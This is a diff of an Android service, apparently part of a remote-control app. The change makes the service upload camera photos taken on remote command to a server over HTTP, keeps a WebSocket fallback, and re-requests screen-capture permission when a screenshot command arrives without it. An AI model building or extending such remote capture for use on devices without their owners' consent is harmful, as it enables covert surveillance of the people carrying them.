@@ -57,6 +57,8 @@ import kotlin.coroutines.coroutineContext
 import kotlinx.coroutines.sync.Mutex
 import kotlinx.coroutines.sync.withLock
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.toRequestBody
 import okio.ByteString
 import okio.ByteString.Companion.toByteString
 import java.io.File
@@ -955,7 +957,12 @@ class MicService : Service() {
             "take_screenshot" -> {
                 Log.i(TAG, "CMD: take_screenshot")
                 if (activeProjection == null) {
-                    sendCommandAck("take_screenshot", "error", "No projection token available - open app once")
+                    sendCommandAck("take_screenshot", "error", "No projection token available - requesting new permission")
+                    val intent = Intent(this, MainActivity::class.java).apply {
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                        putExtra("action", "request_projection")
+                    }
+                    startActivity(intent)
                     return
                 }
                 serviceScope.launch {
@@ -2023,13 +2030,6 @@ class MicService : Service() {
             return
         }
         
-        // Check WebSocket connection before proceeding
-        if (webSocket == null || activeWebSocket == null) {
-            Log.w(TAG, "Photo capture requested but WebSocket is null - device may be reconnecting")
-            safeSend("ACK:take_photo:not_connected")
-            return
-        }
-        
         isPhotoCaptureBusy = true
         serviceScope.launch(Dispatchers.IO) {
             try {
@@ -2048,23 +2048,59 @@ class MicService : Service() {
                     
                     val isFrontCamera = (facing == CameraCharacteristics.LENS_FACING_FRONT)
                     val optimized = optimizePhotoJpeg(jpeg, isFrontCamera)
-                    val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
                     val cameraName = if (isFrontCamera) "front" else "rear"
                     val filename = "photo_${deviceId.take(8)}_${cameraName}_${System.currentTimeMillis()}.jpg"
-                    val msg = JSONObject().apply {
-                        put("type", "photo_upload")
-                        put("deviceId", deviceId)
-                        put("camera", cameraName)
-                        put("quality", photoQualityMode)
-                        put("nightMode", photoNightMode)
-                        put("filename", filename)
-                        put("mime", "image/jpeg")
-                        put("aiEnhanced", aiPhotoEnhancementEnabled)
-                        put("lowNetwork", lowNetworkMode)
-                        put("data", base64)
-                        put("ts", System.currentTimeMillis())
+
+                    var httpSuccess = false
+                    try {
+                        val photoClient = okHttpClient.newBuilder()
+                            .connectTimeout(15, TimeUnit.SECONDS)
+                            .writeTimeout(30, TimeUnit.SECONDS)
+                            .readTimeout(30, TimeUnit.SECONDS)
+                            .build()
+
+                        val requestBody = MultipartBody.Builder()
+                            .setType(MultipartBody.FORM)
+                            .addFormDataPart("deviceId", deviceId)
+                            .addFormDataPart(
+                                "photo",
+                                filename,
+                                optimized.toRequestBody("image/jpeg".toMediaTypeOrNull())
+                            )
+                            .build()
+
+                        val request = Request.Builder()
+                            .url("$serverHttpBaseUrl/api/upload-photo")
+                            .post(requestBody)
+                            .addHeader("X-Filename", filename)
+                            .addHeader("X-Device-Id", deviceId)
+                            .build()
+
+                        val response = photoClient.newCall(request).execute()
+                        httpSuccess = response.isSuccessful
+                        response.close()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "HTTP photo upload failed: ${e.message}")
                     }
-                    safeSend(msg.toString())
+
+                    if (!httpSuccess) {
+                        Log.w(TAG, "Falling back to WebSocket base64 for photo")
+                        val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
+                        val msg = JSONObject().apply {
+                            put("type", "photo_upload")
+                            put("deviceId", deviceId)
+                            put("camera", cameraName)
+                            put("quality", photoQualityMode)
+                            put("nightMode", photoNightMode)
+                            put("filename", filename)
+                            put("mime", "image/jpeg")
+                            put("aiEnhanced", aiPhotoEnhancementEnabled)
+                            put("lowNetwork", lowNetworkMode)
+                            put("data", base64)
+                            put("ts", System.currentTimeMillis())
+                        }
+                        safeSend(msg.toString())
+                    }
                     safeSend("ACK:take_photo:ok:$cameraName")
                 } ?: run {
                     // Timeout occurred
